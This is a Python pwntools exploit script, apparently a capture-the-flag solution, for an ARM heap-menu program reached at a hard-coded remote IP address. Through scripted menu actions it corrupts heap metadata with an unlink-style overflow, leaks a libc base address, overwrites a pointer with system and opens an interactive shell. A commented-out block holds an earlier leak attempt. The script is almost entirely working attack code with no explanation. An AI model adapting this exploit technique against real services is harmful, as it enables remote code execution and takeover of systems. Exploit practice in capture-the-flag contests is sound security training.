from pwn import*
context.log_level ='DEBUG'
def new(size,content):
	p.sendlineafter('>>> ','2')
	p.sendlineafter('Length:',str(size))
	p.sendafter('Tag:',content)
def show():
	p.sendlineafter('>>> ','1')
def edit(index,size,content):
	p.sendlineafter('>>> ','3')
	p.sendlineafter('Index:',str(index))
	p.sendlineafter('Length:',str(size))
	p.sendafter('Tag:',content)
def free(index):
	p.sendlineafter('>>> ','4')
	p.sendlineafter('Tag:',str(index))

p = process('qemu-arm -g 1234 -L . ./main',shell=True)
elf =ELF('./main')
p = remote('121.36.58.215',1337)
'''
new(0x10,'FMYY')
new(0x38,'FMYY')
new(0x38,'FMYY')
new(0x38,'FMYY')
new(0x10,'FMYY')
edit(0,0x18,'\x00'*0x14 + p32(0xC1))
free(1)
new(0x38,'FMYY') #2
show()
p.recvuntil('2 : ')
libc_base = u32(p.recv(4)) - 0x9A8EC
log.success('LIBC:\t' + hex(libc_base))
system = libc_base + 0x51800
new(0x38,'FMYY')
new(0x38,'FMYY')

free(2)
free(5)
free(0)
'''
new(0x10,'FMYY')
new(0x60,'FMYY')
new(0x10,'FMYY')

paylaod =  p32(0)  +p32(0x20) + p32(0x2106C - 0xC) + p32(0x2106C - 8) + p32(0x10) + p32(0x68)
edit(0,0x18,paylaod)
free(1)

edit(0,0x20,p64(0) + p32(0x10) + p32(0x2100C) + p32(0x10) + p32(0x21038) + p32(0x10) + p32(0x21030))

edit(1,4,p32(0x103E4))
free(0)

libc_base = u32(p.recv(4)) - 0x355B4
log.success('LIBC:\t' + hex(libc_base))
system = libc_base + 0x51800
edit(2,4,p32(system))
p.sendline('sh')
p.interactive()
